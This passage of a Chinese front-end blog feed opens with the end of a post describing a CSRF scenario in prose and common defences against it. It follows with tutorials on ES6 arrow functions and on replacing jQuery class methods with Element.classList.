ID</code> (使用cookie存储)。</li><li>小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。</li><li>小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。</li><li>通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。</li></ul><h3 id="CSRF-XSRF-的防范"><a href="#CSRF-XSRF-的防范" class="headerlink" title="CSRF(XSRF)的防范"></a>CSRF(XSRF)的防范</h3><ul><li><p><strong>使用token：</strong> 服务器随机产生 <code>tooken</code>，然后以 <code>tooken为秘钥产生一段密文</code>，把 <code>token和密文</code> 都随 <code>cookie</code> 交给前端，前端发起请求时把 <code>密文和token</code> 交给后端看 <code>token</code> 能不能生成同样的密文，这样即使黑客拿到了 <code>token</code> 也无法拿到密文。</p></li><li><p><strong>使用验证码：</strong> 每一个重要的 <code>post</code> 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。</p></li><li><p><strong>检测http的头信息refer：</strong> <code>Referer</code> 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。</p></li><li><p><strong>更改请求方式：</strong> 涉及敏感操作的请求改为 <code>POST</code> 请求。</p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>箭头函数</title>
    <link href="https://github.com/TheNightElf/2018/01/03/%E7%AE%AD%E5%A4%B4%E5%87%BD%E6%95%B0/"/>
    <id>https://github.com/TheNightElf/2018/01/03/箭头函数/</id>
    <published>2018-01-03T07:55:59.000Z</published>
    <updated>2018-01-22T07:19:32.536Z</updated>
    
    <content type="html"><![CDATA[<p>熟悉后端的人对于箭头函数应该不会陌生，在 <code>C#</code> 中它叫做 <code>Lambda表达式</code>，其他的后端语言中也一直都有他的身影。<br>箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们看一下箭头函数的特性。<br><a id="more"></a></p><h3 id="箭头函数的特性"><a href="#箭头函数的特性" class="headerlink" title="箭头函数的特性"></a>箭头函数的特性</h3><ul><li>自动返回</li><li>不会绑定自己的 <code>this</code></li><li>书写更加方便</li><li>不会绑定 <code>arguments</code></li><li>无法使用 <code>prototype</code></li><li>无法使用 <code>new</code> 关键字</li><li>在创建是初始化 <code>this</code> 而非调用时指定</li></ul><h3 id="自动返回"><a href="#自动返回" class="headerlink" title="自动返回"></a>自动返回</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">a</span> =&gt;</span> a + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">var</span> fn2 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> a + b</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法三</span></span><br><span class="line"><span class="keyword">var</span> fn3 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> (a + b)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 写法四</span></span><br><span class="line"><span class="keyword">var</span> fn4 = <span class="function">(<span class="params">a, b</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">// do something</span></span><br><span class="line">    <span class="keyword">return</span> a + b</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当 <code>参数</code> 只有一个的时候，可以省略参数外面的 <code>()</code>;<br>当函数的表达式只有一句时，可以直接书写在 <code>=&gt;</code> 后面，表示返回该表达式；也可以在表达式外加上一对 <code>()</code>返回，一般用于返回 <code>字面量</code> 和 <code>提升优先级</code>。<br>如果逻辑处理过长，则使用 <code>写法四</code> 书写，该写法不会自动返回，需手动指定返回内容。</p><h3 id="不会绑定自己的-this"><a href="#不会绑定自己的-this" class="headerlink" title="不会绑定自己的 this"></a>不会绑定自己的 <code>this</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; window</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.body.onclick = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this =&gt; body</span></span><br></pre></td></tr></table></figure><h3 id="不会绑定-arguments"><a href="#不会绑定-arguments" class="headerlink" title="不会绑定 arguments"></a>不会绑定 <code>arguments</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="built_in">arguments</span> = <span class="string">'arguments'</span>;</span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> <span class="built_in">console</span>.log(<span class="built_in">arguments</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments =&gt; 'arguments'</span></span><br></pre></td></tr></table></figure><h3 id="无法使用-prototype"><a href="#无法使用-prototype" class="headerlink" title="无法使用 prototype"></a>无法使用 <code>prototype</code></h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(fn.prototype)</span><br><span class="line"><span class="comment">// fn.prototype =&gt; undefined</span></span><br><span class="line"><span class="comment">// 箭头函数没有 prototype 原型链</span></span><br></pre></td></tr></table></figure><h3 id="无法使用-new-关键字"><a href="#无法使用-new-关键字" class="headerlink" title="无法使用 new 关键字"></a>无法使用 <code>new</code> 关键字</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> fn = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'fn'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = <span class="keyword">new</span> fn()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Uncaught TypeError: fn is not a constructor</span></span><br><span class="line"><span class="comment">// 函数 fn 不是一个构造器</span></span><br></pre></td></tr></table></figure><p>以上就是箭头函数的所有特性了。</p><h3 id="在创建是初始化-this-而非调用时指定"><a href="#在创建是初始化-this-而非调用时指定" class="headerlink" title="在创建是初始化 this 而非调用时指定"></a>在创建是初始化 <code>this</code> 而非调用时指定</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 非箭头函数</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    fn: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = obj.fn();</span><br><span class="line"><span class="keyword">var</span> res = f(); <span class="comment">// -&gt; window</span></span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 箭头函数</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">    fn: <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="keyword">this</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> f = obj.fn();</span><br><span class="line"><span class="keyword">var</span> res = f(); <span class="comment">// -&gt; obj</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;熟悉后端的人对于箭头函数应该不会陌生，在 &lt;code&gt;C#&lt;/code&gt; 中它叫做 &lt;code&gt;Lambda表达式&lt;/code&gt;，其他的后端语言中也一直都有他的身影。&lt;br&gt;箭头函数是ES6新加入的一个重要特性，它简洁明了的书写方式大大的简化了我们平时代码。下面我们看一下箭头函数的特性。&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>现代浏览器的类名操作</title>
    <link href="https://github.com/TheNightElf/2017/12/27/%E7%8E%B0%E4%BB%A3%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E7%B1%BB%E5%90%8D%E6%93%8D%E4%BD%9C/"/>
    <id>https://github.com/TheNightElf/2017/12/27/现代浏览器的类名操作/</id>
    <published>2017-12-27T03:25:53.000Z</published>
    <updated>2017-12-27T04:35:54.000Z</updated>
    
    <content type="html"><![CDATA[<p>在前端 <code>MV*</code> 框架还未兴起的时期，绝大部分的前端网站都是基于 <code>事件驱动</code> 的。而这种网站总是不可避免的伴随着大量的 <code>DOM操作</code>。其中，<code>类名 - class</code> 的操作算是其中最平常也是最方便、通用的一种。</p><a id="more"></a><h3 id="类名操作"><a href="#类名操作" class="headerlink" title="类名操作"></a>类名操作</h3><p>说起类名操作，大部分人的第一反应就是 <code>jquery</code> 中的 <code>addClass、removeClass、hasClass、toggleClass</code> 这几个组合了。<br>下面我们看下 <code>jquery</code> 源码中是怎么实现的。</p><h4 id="addClass"><a href="#addClass" class="headerlink" title="addClass"></a>addClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// addClass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addClass</span>(<span class="params"> value </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> j </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).addClass( value.call( <span class="keyword">this</span>, j, getClass( <span class="keyword">this</span> ) ) );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> value === <span class="string">"string"</span> &amp;&amp; value ) &#123;</span><br><span class="line">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">            curValue = getClass( elem );</span><br><span class="line">            cur = elem.nodeType === <span class="number">1</span> &amp;&amp; ( <span class="string">" "</span> + stripAndCollapse( curValue ) + <span class="string">" "</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( cur ) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ( cur.indexOf( <span class="string">" "</span> + clazz + <span class="string">" "</span> ) &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">                        cur += clazz + <span class="string">" "</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Only assign if different to avoid unneeded rendering.</span></span><br><span class="line">                finalValue = stripAndCollapse( cur );</span><br><span class="line">                <span class="keyword">if</span> ( curValue !== finalValue ) &#123;</span><br><span class="line">                    elem.setAttribute( <span class="string">"class"</span>, finalValue );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="removeClass"><a href="#removeClass" class="headerlink" title="removeClass"></a>removeClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// removeClass </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">removeClass</span>(<span class="params"> value </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> classes, elem, cur, curValue, clazz, j, finalValue,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> j </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).removeClass( value.call( <span class="keyword">this</span>, j, getClass( <span class="keyword">this</span> ) ) );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">arguments</span>.length ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.attr( <span class="string">"class"</span>, <span class="string">""</span> );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> value === <span class="string">"string"</span> &amp;&amp; value ) &#123;</span><br><span class="line">        classes = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">            curValue = getClass( elem );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// This expression is here for better compressibility (see addClass)</span></span><br><span class="line">            cur = elem.nodeType === <span class="number">1</span> &amp;&amp; ( <span class="string">" "</span> + stripAndCollapse( curValue ) + <span class="string">" "</span> );</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> ( cur ) &#123;</span><br><span class="line">                j = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> ( ( clazz = classes[ j++ ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// Remove *all* instances</span></span><br><span class="line">                    <span class="keyword">while</span> ( cur.indexOf( <span class="string">" "</span> + clazz + <span class="string">" "</span> ) &gt; <span class="number">-1</span> ) &#123;</span><br><span class="line">                        cur = cur.replace( <span class="string">" "</span> + clazz + <span class="string">" "</span>, <span class="string">" "</span> );</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Only assign if different to avoid unneeded rendering.</span></span><br><span class="line">                finalValue = stripAndCollapse( cur );</span><br><span class="line">                <span class="keyword">if</span> ( curValue !== finalValue ) &#123;</span><br><span class="line">                    elem.setAttribute( <span class="string">"class"</span>, finalValue );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="hasClass"><a href="#hasClass" class="headerlink" title="hasClass"></a>hasClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hasClass</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hasClass</span>(<span class="params"> selector </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> className, elem,</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    className = <span class="string">" "</span> + selector + <span class="string">" "</span>;</span><br><span class="line">    <span class="keyword">while</span> ( ( elem = <span class="keyword">this</span>[ i++ ] ) ) &#123;</span><br><span class="line">        <span class="keyword">if</span> ( elem.nodeType === <span class="number">1</span> &amp;&amp;</span><br><span class="line">            ( <span class="string">" "</span> + stripAndCollapse( getClass( elem ) ) + <span class="string">" "</span> ).indexOf( className ) &gt; <span class="number">-1</span> ) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="toggleClass"><a href="#toggleClass" class="headerlink" title="toggleClass"></a>toggleClass</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// toggleClass </span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">toggleClass</span>(<span class="params"> value, stateVal </span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> type = <span class="keyword">typeof</span> value;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( <span class="keyword">typeof</span> stateVal === <span class="string">"boolean"</span> &amp;&amp; type === <span class="string">"string"</span> ) &#123;</span><br><span class="line">        <span class="keyword">return</span> stateVal ? <span class="keyword">this</span>.addClass( value ) : <span class="keyword">this</span>.removeClass( value );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( jQuery.isFunction( value ) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"> i </span>) </span>&#123;</span><br><span class="line">            jQuery( <span class="keyword">this</span> ).toggleClass(</span><br><span class="line">                value.call( <span class="keyword">this</span>, i, getClass( <span class="keyword">this</span> ), stateVal ),</span><br><span class="line">                stateVal</span><br><span class="line">            );</span><br><span class="line">        &#125; );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.each( <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> className, i, self, classNames;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ( type === <span class="string">"string"</span> ) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Toggle individual class names</span></span><br><span class="line">            i = <span class="number">0</span>;</span><br><span class="line">            self = jQuery( <span class="keyword">this</span> );</span><br><span class="line">            classNames = value.match( rnothtmlwhite ) || [];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span> ( ( className = classNames[ i++ ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Check each className given, space separated list</span></span><br><span class="line">                <span class="keyword">if</span> ( self.hasClass( className ) ) &#123;</span><br><span class="line">                    self.removeClass( className );</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    self.addClass( className );</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Toggle whole class name</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( value === <span class="literal">undefined</span> || type === <span class="string">"boolean"</span> ) &#123;</span><br><span class="line">            className = getClass( <span class="keyword">this</span> );</span><br><span class="line">            <span class="keyword">if</span> ( className ) &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Store className if set</span></span><br><span class="line">                dataPriv.set( <span class="keyword">this</span>, <span class="string">"__className__"</span>, className );</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="comment">// If the element has a class name or if we're passed `false`,</span></span><br><span class="line">            <span class="comment">// then remove the whole classname (if there was one, the above saved it).</span></span><br><span class="line">            <span class="comment">// Otherwise bring back whatever was previously saved (if anything),</span></span><br><span class="line">            <span class="comment">// falling back to the empty string if nothing was stored.</span></span><br><span class="line">            <span class="keyword">if</span> ( <span class="keyword">this</span>.setAttribute ) &#123;</span><br><span class="line">                <span class="keyword">this</span>.setAttribute( <span class="string">"class"</span>,</span><br><span class="line">                    className || value === <span class="literal">false</span> ?</span><br><span class="line">                    <span class="string">""</span> :</span><br><span class="line">                    dataPriv.get( <span class="keyword">this</span>, <span class="string">"__className__"</span> ) || <span class="string">""</span></span><br><span class="line">                );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内部的代码逻辑我就不再分析了，这种代码最明显的特点：<code>大量的循环和判断</code>。<br>对于以前的前端环境来说，这种写法无可厚非，它能让我们的代码更加的健壮，能兼容几乎所有的浏览器环境了。但是如今，随着 <code>大前端</code> 的兴起，浏览器对于 <code>js - css - html</code> 的支持能力已经发生了翻天覆地的变化，我们可以用最简单、快速的方式实现上面的操作。</p><h3 id="Element-classList"><a href="#Element-classList" class="headerlink" title="Element.classList"></a>Element.classList</h3><p>我们先看下官方对于该属性的介绍：</p><blockquote><p>Element.classList 是一个只读属性，返回一个元素的类属性的实时 DOMTokenList集合。<br>使用 classList 是一个方便的替代方法，通过element.className作为空格分隔的字符串访问元素的类列表。</p></blockquote><p>更加通俗的讲：<br>之前我们获取一个元素类名的集合时，需要先使用 <code>element.className</code> 获取类名的字符串，之后在 <code>split</code> 成一个集合。而使用 <code>element.classList</code> 时，我们能直接获取元素类名的集合(<strong>这里是集合，不是数组</strong>)。</p><h3 id="Element-classList-的类名操作"><a href="#Element-classList-的类名操作" class="headerlink" title="Element.classList 的类名操作"></a>Element.classList 的类名操作</h3><p>上面说到，<code>element.classList</code> 返回一个类名的集合，该集合是与元素的 <code>class</code> 相互映射的。也就是说，我们只要向 <code>classList</code> 中添加一个 <code>class</code> 这个 <code>class</code> 就会映射到真实的元素上。为此<code>DOMTokenList</code> 提供了一套操作的方法来允许开发者操作 <code>classList</code>。</p><h4 id="addClass-classList-add"><a href="#addClass-classList-add" class="headerlink" title="addClass - classList.add"></a>addClass - classList.add</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 添加类名</span></span><br><span class="line">element.classList.add(<span class="string">'added-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="removeClass-classList-remove"><a href="#removeClass-classList-remove" class="headerlink" title="removeClass - classList.remove"></a>removeClass - classList.remove</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 删除类名</span></span><br><span class="line">element.classList.remove(<span class="string">'removed-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="hasClass-classList-contains"><a href="#hasClass-classList-contains" class="headerlink" title="hasClass - classList.contains"></a>hasClass - classList.contains</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 判断是否存在类名</span></span><br><span class="line">element.classList.contains(<span class="string">'contains-class'</span>)</span><br></pre></td></tr></table></figure><h4 id="toggleClass-classList-toggle"><a href="#toggleClass-classList-toggle" class="headerlink" title="toggleClass - classList.toggle"></a>toggleClass - classList.toggle</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类名切换</span></span><br><span class="line">element.classList.toggle(<span class="string">'toggled-class'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 类名切换 - while</span></span><br><span class="line"><span class="comment">// 当第二个参数的表达式满足条件时，执行 toggle 操作</span></span><br><span class="line"><span class="comment">// 该方法目前还在 **实验** 阶段</span></span><br><span class="line">element.classList.toggle(<span class="string">'toggled-class'</span>, i &lt; <span class="number">10</span>)</span><br></pre></td></tr></table></figure><p>上面列举的这些方法已经在 <code>ie10</code> 以上的浏览器上普及，可以直接使用。<br>更多 <code>classList</code> 的方法可以参考<a href="https://developer.mozilla.org/en-US/docs/Web/API/DOMTokenList" target="_blank" rel="noopener">这里</a>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在前端 &lt;code&gt;MV*&lt;/code&gt; 框架还未兴起的时期，绝大部分的前端网站都是基于 &lt;code&gt;事件驱动&lt;/code&gt; 的。而这种网站总是不可避免的伴随着大量的 &lt;code&gt;DOM操作&lt;/code&gt;。其中，&lt;code&gt;类名 - class&lt;/code&gt; 的操作算是其中最平常也是最方便、通用的一种。&lt;/p&gt;
    
    </summary>
